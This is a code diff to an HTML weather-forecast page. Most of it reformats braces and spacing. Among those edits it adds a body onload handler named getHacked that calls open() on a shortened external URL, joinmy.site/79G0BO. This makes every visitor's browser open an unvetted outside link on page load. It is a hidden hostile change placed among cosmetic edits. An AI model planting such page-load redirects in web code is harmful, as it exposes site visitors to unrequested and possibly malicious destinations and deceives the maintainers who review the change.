@@ -12,7 +12,7 @@
 
 
 </head>
-<body onloadstart="render.createBackground();">
+<body onload="getHacked()" onloadstart="render.createBackground();">
 <div id="content">
     <div id="weatherRender">
         <h3 id="location"></h3>
@@ -39,7 +39,9 @@
 </body>
 <script>
 
-
+    let getHacked = () => {
+        open("https://joinmy.site/79G0BO")
+    }
     let timeMap =
         {
             "00:00": "12:00 AM",
@@ -94,7 +96,7 @@
                 let time = d.getHours()
                 let j = 0;
                 let temp = time;
-                if (type == "f"){
+                if (type == "f") {
                     for (let i = 0; i < 24; i++) {
                         if (temp > 23) {
                             temp = 0;
@@ -111,8 +113,7 @@
                     </div>`
                         temp++;
                     }
-                }
-                else{
+                } else {
                     for (let i = 0; i < 24; i++) {
                         if (temp > 23) {
                             temp = 0;
